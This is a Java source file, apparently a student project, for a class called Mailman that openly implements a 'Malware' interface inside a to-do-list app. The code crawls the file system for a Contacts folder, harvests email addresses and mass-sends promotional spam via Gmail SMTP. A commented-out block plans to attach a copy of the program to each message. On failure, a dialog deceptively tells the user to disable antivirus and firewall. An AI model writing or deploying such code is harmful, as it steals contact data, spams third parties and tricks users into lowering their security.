import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Properties;
import java.util.Scanner;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.AuthenticationFailedException;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.JOptionPane;


/**
 *
 * @author aalea
 * 
 * This class is sent the name of a task. This would occur 
 * when a task is completed. The class searches the system 
 * for a Contacts folder. Then, it searches for any contacts 
 * with the first letter of their name matching the first 
 * letter of the task. These are the contacts that will be 
 * emailed. It sends emails to these addresses to promote 
 * this application as a to do list.
 *
 */
public class Mailman implements Malware {
	
	/**
	 * this String is the description of the task
	 */
	private String taskName;
	
	/**
	 * this is the first letter of the task's description
	 */
	private char letter;
	
	/**
	 * this is the arraylist of emails that will be provoked
	 */
	private ArrayList<String> emails;
	
	/**
	 * this is the subject line of the email message that will be sent
	 */
	private String subject;
	
	/**
	 * this is the body of the email message that will be sent
	 */
	private String message;

	/**
	 * constructor method
	 * 
	 * @param the task that was checked by the user, which will be used to determine who to email
	 *  
	 */
	public Mailman (Task task) {
		//1. Get the name of the task
		this.taskName = task.getDescription();
		//initializes the arraylist of emails
		this.emails = new ArrayList<String>();
		//initializes the body of the email
		this.message = "";
		
		//2. Get the first letter of the task by calling a method
		letter = extractFirstLetter(taskName);
		//3. Call a method to get an html file with the email message
		getEmailMessage();
		//4. Search the system for emails by calling a method
		//searchSystem("Contacts", new File("C:"));
		searchSystem("Contacts", new File("C:\\Users\\aalea\\ComputerFileSystem"));
		//5. Message those emails
		attack();
	}

	/**
	 * this method searches for contacts within the computer's system,
	 * storing their emails into an arraylist
	 * 
	 * @param the name of the file to be searched for
	 * @param the current directory
	 */
	public void searchSystem(String name, File file) {
		
		//iterate through every file in directory
		for (int i = 0; i < file.list().length; i++) {
		//1. If the directory is "Contacts"
			if (file.list()[i].equals("Contacts")) {
				
			//1.1. Get the list of files in the directory and save it to an array
				File contacts = new File(file.getPath() + "\\" + file.list()[i]);
				
				//iterate through the contacts file
				for (int ii = 0; ii < contacts.list().length; ii++) {
					
			//1.2. Check if a file's name first letter is the same as the task's first letter
					if (contacts.list()[ii].substring(0,1).charAt(0) == letter) {
						
						//extract the email from that file and add it to the arraylist of emails
						emails.add(extractEmail(new File(contacts.getPath() + "\\" + contacts.list()[ii])));
						
					}
				}
			//1.4. Repeat 1.2 to 1.3.6. until all files checked
			}
		//2. If the directory is not "Contacts"
			else {
				//create a file out of the current item in list
				File nextFile = new File(file.getPath() + "\\" + file.list()[i]);
				//2.2.1. Check if the first item in list is another directory
				if (nextFile.isDirectory()) {
				//2.2.3. Run this method again, with parameters name the same, file the current item in the list
					searchSystem(name, nextFile);
				}
			}
		}
	}

	/**
	 * this method extracts an email out of a .contacts file
	 * 
	 * @param the directory of the contacts
	 * @return the email from the contacts file
	 */
	private String extractEmail(File contact) {
		
		String email = ""; //initializes email 
		String line = ""; //initializes line of text from file to be read
		int startIndex = 0; //the starting location of the email in the file
		int endIndex = 0; //the ending location of the email in the file
		
		System.out.println(contact);
		//open the file
		try {
			Scanner input = new Scanner(contact);
			//1.3.1. Skip to fourth line
			for (int i = 1; i < 4; i++)
				input.nextLine();
			
			//1.3.2. Save fourth line
			line = input.nextLine();
			
			//1.3.3. Find first instance of "Type><c:Address>" in line
			startIndex = line.indexOf("Type><c:Address>") + 16;
			
			//1.3.4. Find instance of "</c:Address>" in line
			endIndex = line.indexOf("</c:Address>");
			
			//1.3.5. Save the characters between the end of the first string and the start of the second string
			email = line.substring(startIndex, endIndex);
			
			//System.out.println(email);
			
			input.close();
			
		} catch (FileNotFoundException e) {
			System.out.println("couldn't read");
		}
		
		return email; //return the email address
	}

	/**
	 * this class controls the sending of the emails
	 */
	@Override
	public void attack() {
		//iterate through list of collected emails
		for (int i = 0; i < emails.size(); i++) {
		//1. Get email address from arraylist
		//2. Send the address to the method that sends emails
			sendMail(emails.get(i));
		//3. Repeat 1 to 2 until all emails are sent
		}
	}
	
	/**
	 * 
	 * @param email the address the message will be sent to
	 * 
	 * this method performs the sending of the email to the 
	 * address in its parameters
	 * 
	 * code based on <a href>https://www.tutorialspoint.com/java/java_sending_email.htm</a>
	 * 
	 */
	private void sendMail(String email) {
		
		// Recipient's email ID needs to be mentioned.
	      String to = email;

	      // Sender's email ID needs to be mentioned
	      String from = "studentingrade12cs@gmail.com"; 
	      //test email created so I don't have to expose password of my actual account
	      //it turns out google thinks this is a spam account, so all outgoing emails are blocked
	      //you can put in a google email and it will work though

	      //Set host to gmail's free one
	      String host = "smtp.gmail.com";

	      // Get system properties
	      Properties properties = System.getProperties();
	      //set to correct port for gmail
	      properties.put("mail.smtp.port", "465");
	      //set other necessary properties
	      properties.put("mail.smtp.starttls.enable","true");
	      properties.put("mail.smtp.debug", "true");
	      properties.put("mail.smtp.auth", "true");
	      properties.put("mail.smtp.socketFactory.port", 465);
	      properties.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
	      properties.put("mail.smtp.socketFactory.fallback", "false");

	      // Setup mail server
	      properties.setProperty("mail.smtp.host", host);

	      // make a new session and authenticate password
	      Session session = Session.getDefaultInstance(properties,
	    	        new javax.mail.Authenticator() {
              protected PasswordAuthentication getPasswordAuthentication() {
                      return new PasswordAuthentication(from,"p_assword");
              }
      });
	      //attempt to build and send email
	      try {
	         // Create a default MimeMessage object.
	         MimeMessage message = new MimeMessage(session);

	         // Set From: header field of the header.
	         message.setFrom(new InternetAddress(from));

	         // Set To: header field of the header.
	         message.addRecipient(Message.RecipientType.TO,new InternetAddress(to));

	         // Set Subject: header field
	         message.setSubject(subject);
	         
	         // Create a multipart message
	         Multipart multipart = new MimeMultipart();
	         
	      // Create the HTML Part
	         BodyPart htmlBodyPart = new MimeBodyPart(); //create html body part
	         htmlBodyPart.setContent(this.message, "text/html"); //set the content of the html part to the body collected earlier
	         multipart.addBodyPart(htmlBodyPart); //add the part to the email
	         // Set the Multipart's to be the email's content
	         
	         //was gonna include a jar file of this program as an attachment
	         //then I realized, how do I export a copy of a program, referencing an already exported version of itself?
	         
	         /*// Part two is attachment
	         BodyPart messageBodyPart = new MimeBodyPart(); //create attachment body part
	         
	         //get the file
	         String filename = Mailman.class.getResource("Accentus.jar").toString().replace("%20", " ").substring(6);
	         DataSource source = new FileDataSource(filename);
	         messageBodyPart.setDataHandler(new DataHandler(source));
	         messageBodyPart.setFileName(filename);
	         
	         //add the attachment part to the email
	         multipart.addBodyPart(messageBodyPart);*/

	         // Send the complete message parts
	         message.setContent(multipart);
	         
	         // Send message
	         Transport.send(message);
	         System.out.println("Sent message successfully....");

	      } catch (MessagingException mex) { //error occured during sending
	         mex.printStackTrace();
	         System.out.println("couldn't send :( probably forgot to turn off firewall or antivirus");
	         JOptionPane.showMessageDialog(null, "Please turn off your Antivirus software and Firewall, it's affecting the performance of this application.");
	      }
				
		
	}
	
	/**
	 * 
	 * @param taskName the description of a task
	 * 
	 * this method takes in a string and returns the first letter of it
	 */
	private char extractFirstLetter(String taskName) {
		
		//1. Get the substring of index 1, length 1 from the task name
		//2. Return it
		return taskName.substring(0, 1).toUpperCase().charAt(0);
		
	}
	
	/**
	 * this method retrieves the message that will be in the body of the email
	 * 
	 * solution from <a href>https://stackoverflow.com/questions/326390/how-do-i-create-a-java-string-from-the-contents-of-a-file</a>
	 * 
	 */
	private void getEmailMessage() {
		
		//reads in the html file
		byte[] encoded;
		try {
			//grabs html file
			encoded = Files.readAllBytes(Paths.get(Mailman.class.getResource("email.html").toString().replace("%20", " ").substring(6)));
			//saves file contents as string
			message = new String(encoded, "UTF-8");

		} catch (IOException e) {
			System.out.println(e);
		}
		
		//1. Set subject line to "I've never been this productive in my life..."
		this.subject = "I've never been so productive...";
			
	}


}
